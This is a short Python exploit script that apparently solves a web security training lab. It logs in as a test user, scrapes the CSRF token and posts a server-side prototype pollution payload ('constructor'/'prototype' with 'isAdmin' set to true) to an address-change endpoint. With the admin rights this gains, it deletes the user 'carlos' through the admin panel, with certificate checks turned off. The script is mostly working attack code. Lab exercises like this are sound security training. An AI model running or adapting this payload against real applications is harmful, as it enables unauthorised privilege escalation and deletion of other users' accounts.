import requests
import re


# Disable certificate warning
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

url = "https://0a970002049d42f4817bbb5000920094.web-security-academy.net"  #change to lab URL
username = "wiener"
password = "peter"

login_session = requests.session()
login_url = url + "/login"
r = login_session.get(login_url,verify=False)
match = re.search(r'name="csrf" value="(.+)">',r.text)
login_csrf_token = match.group(1)
print(f"login csrf token in {login_csrf_token}")

login_data = {"csrf":login_csrf_token,"username":username,"password":password}
r = login_session.post(login_url,verify=False,json=login_data)
session_value = login_session.cookies.get_dict()['session']
print(f"login success and session is {session_value}")

change_data = {"address_line_1":"Wiener HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","sessionId":session_value,"constructor":{"prototype":{"isAdmin":True}}}
r = login_session.post(url+"/my-account/change-address",verify=False,json=change_data)

r = login_session.get(url+"/admin/delete?username=carlos",verify=False)
print("Carlos deleted")